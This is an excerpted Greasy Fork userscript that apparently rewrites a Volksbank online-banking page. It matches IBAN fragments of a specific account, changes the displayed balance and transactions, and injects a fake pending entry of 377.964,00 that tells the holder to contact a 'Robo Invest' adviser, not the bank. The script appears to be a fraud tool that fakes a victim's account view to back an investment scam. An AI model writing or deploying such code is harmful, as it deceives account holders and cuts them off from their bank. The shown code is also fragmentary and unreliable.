// ==UserScript==
// @name         Ed Rob Volks Reinhard Blömeke
...
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/492346/Ed%20Rob%20Volks%20Reinhard%20Bl%C3%B6meke.user.js
// @updateURL https://update.greasyfork.org/scripts/492346/Ed%20Rob%20Volks%20Reinhard%20Bl%C3%B6meke.meta.js
// ==/UserScript==
...
//222222444444---------------VOLKS UMSAETZE AND UEBER BAL CHANGE---------------------------------------------------------------------------------------------------------------
    ...
    var targetTextContent1 = "DE96 6409 1200";
    var targetTextContent2 = " 0253 1760 00";
...
//33333333333---------------VOLKS UMSAETZE MULTIPLE TRANSACTIONS--------------------------------------------------------------------------------------------------------------
    ...
    const TRANSACTIONS = [

        {
            ...
            description: 'Freigabe nötig. Wenden Sie sich an Robo Invest Berater, nicht die Bank, damit nicht gesperrt.',
            amount: '377.964,00',
            date: 'Vorgemerkt',
